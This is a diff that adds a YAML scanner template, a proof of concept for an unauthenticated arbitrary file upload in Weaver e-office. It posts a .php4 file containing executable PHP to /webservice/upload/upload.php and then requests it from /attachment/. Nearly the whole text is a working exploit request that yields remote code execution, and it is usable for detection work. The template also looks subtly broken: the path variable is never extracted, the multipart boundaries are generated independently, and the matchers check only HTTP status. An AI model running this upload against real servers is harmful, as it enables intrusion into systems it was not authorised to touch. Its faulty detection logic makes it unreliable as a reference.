@@ -1,0 +1,42 @@
+id: poc-yaml-eweaver-eoffice-webservice-upload-fileupload
+
+info:
+  name: poc-yaml-eweaver-eoffice-webservice-upload-fileupload
+  author: y0y0
+  severity: critical
+  tags: xray-converted,fileupload
+  reference:
+    - https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-0125638
+    - https://fofa.info/result?qbase64=YXBwPSLms5vlvq4tRU9mZmljZSI%3D
+    - https://www.t00ls.com/thread-68187-1-1.html
+
+http:
+  - raw:
+      - |
+        POST /webservice/upload/upload.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rand_base(8)}}
+
+        ------WebKitFormBoundary{{rand_base(8)}}
+        Content-Disposition: form-data; name="file"; filename="{{rand_base(8)}}.php4"
+        Content-Type: application/octet-stream
+        
+        <?php echo md5({{rand_int(1000, 9999)}});unlink(__FILE__);?>
+        ------WebKitFormBoundary{{rand_base(8)}}--
+        
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        GET /attachment/{{path}} HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
